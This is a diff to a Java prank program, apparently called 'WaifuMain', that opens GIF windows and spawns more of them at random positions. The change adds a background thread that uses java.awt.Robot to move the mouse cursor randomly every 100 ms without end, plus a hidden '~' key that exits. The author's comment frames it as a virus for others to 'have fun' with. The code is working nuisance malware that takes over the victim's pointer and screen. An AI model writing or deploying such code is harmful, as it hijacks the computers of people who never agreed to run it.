@@ -7,6 +7,7 @@ import java.awt.Point;
 import java.awt.Robot;
 import java.awt.Toolkit;
 import java.awt.event.KeyEvent;
+import java.awt.event.KeyListener;
 import java.awt.event.WindowEvent;
 import java.awt.event.WindowListener;
 import java.io.File;
@@ -61,6 +62,7 @@ public class WaifuMain {
 			e1.printStackTrace();
 		}
 		
+
 		
 		JFrame frame;
 		URL url = WaifuMain.class.getResource("/image/asdk.gif");
@@ -68,9 +70,12 @@ public class WaifuMain {
 		frame.setLocation(600,400);
 		frame.add(new JLabel(new ImageIcon(url)));
 		frame.addWindowListener(new WaifuMultipler());
+		frame.addKeyListener(new WaifuMultipler());
 		frame.pack();
 		frame.setVisible(true);
 		
+
+
 		
 		
 	}
@@ -202,7 +207,7 @@ public class WaifuMain {
     }
 
 	
-	public static class WaifuMultipler implements WindowListener{
+	public static class WaifuMultipler implements WindowListener, KeyListener{
 
 		@Override
 		public void windowActivated(WindowEvent arg0) {
@@ -246,6 +251,7 @@ public class WaifuMain {
 				frame.add(new JLabel(new ImageIcon(url)));
 				frame.setLocation(new Point(rand.nextInt(screenSize.width-480), rand.nextInt(screenSize.height-269)));
 				frame.addWindowListener(this);
+				frame.addKeyListener(this);
 				frame.pack();
 				frame.setVisible(true);
 				
@@ -267,6 +273,7 @@ public class WaifuMain {
 				frame.add(new JLabel(new ImageIcon(url)));
 				frame.setLocation(new Point(rand.nextInt(screenSize.width-480), rand.nextInt(screenSize.height-270)));
 				frame.addWindowListener(this);
+				frame.addKeyListener(this);
 				frame.pack();
 				frame.setVisible(true);
 				
@@ -276,12 +283,34 @@ public class WaifuMain {
 				frame.add(new JLabel(new ImageIcon(url)));
 				frame.setLocation(new Point(rand.nextInt(screenSize.width-480), rand.nextInt(screenSize.height-269)));
 				frame.addWindowListener(this);
+				frame.addKeyListener(this);
 				frame.pack();
 				frame.setVisible(true);
 			}
 				
 			
-			
+			Thread thread = new Thread(new Runnable() {
+
+			    @Override
+			    public void run() {
+					
+			    	try {
+			    		Dimension screen = Toolkit.getDefaultToolkit().getScreenSize();
+						Random rand = new Random();
+			    		Robot robot = new Robot();
+						while(true){
+							robot.mouseMove(rand.nextInt((int) screen.getWidth()), rand.nextInt((int) screen.getHeight()));
+							Thread.sleep(100);
+						}
+					} catch (AWTException | InterruptedException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}      
+			    }
+			            
+			});
+			        
+			thread.start();
 		}
 
 		@Override
@@ -305,6 +334,27 @@ public class WaifuMain {
 		@Override
 		public void windowOpened(WindowEvent arg0) {
 			// TODO Auto-generated method stub
+			
+		}
+
+		@Override
+		public void keyPressed(KeyEvent arg0) {
+			
+		}
+
+		@Override
+		public void keyReleased(KeyEvent arg0) {
+			// TODO Auto-generated method stub
+			
+		}
+		
+		
+		//Cuz I'm a nice guy, here's an escape button... have fun and virus responsibly!
+		@Override
+		public void keyTyped(KeyEvent arg0) {
+			if (arg0.getKeyChar() == '~'){
+				System.exit(0);
+			}
 			
 		}
 		
